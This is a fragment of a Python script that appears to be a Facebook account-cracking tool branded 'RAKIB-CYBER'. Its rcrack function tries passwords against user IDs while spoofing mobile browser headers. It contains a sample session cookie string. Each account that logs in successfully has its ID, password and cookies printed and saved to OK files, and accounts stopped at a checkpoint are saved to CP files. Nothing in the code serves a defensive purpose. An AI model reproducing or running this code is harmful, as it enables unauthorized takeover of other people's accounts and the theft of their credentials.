...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=4Aj2ZebG0bmirfc9ZYVLBGhF; sb=4Aj2ZchopWPNz-T8H2xjMLbj; ps_l=0; ps_n=0; locale=bn_IN; vpd=v1%3B624x360x1.7004296779632568; wl_cbv=v2%3Bclient_version%3A2437%3Btimestamp%3A1710623150; m_pixel_ratio=1.7004296779632568; wd=423x734; fr=0xCgpQlCNOxvcJA0c.AWVcaA9xLu5EUTw7J_YXMbIY0uY.Bl9gjg..AAA.0.0.Bl-K1w.AWUhXyWckd4',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"TECNO CB7"',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('    \033[38;5;45m[RAKIB-CYBER-OK] '+uid+' | '+ps+'\033[38;5;46m'+asha(uid)+'\n    \033[38;5;196m[User-Agent]\033[38;5;195m'+pro+' \033[1;91m ')
                print(f'    \033[38;5;46m[COOKIES] \033[38;5;192m'+coki)
                cek_apk(session,coki)
                open('/sdcard/RAKIB-CYBER-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\r\r\33[1;31m [RAKIB-CYBER-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/RAKIB-CYBER-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r \33[1;93m[%sRAKIB-CYBER\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
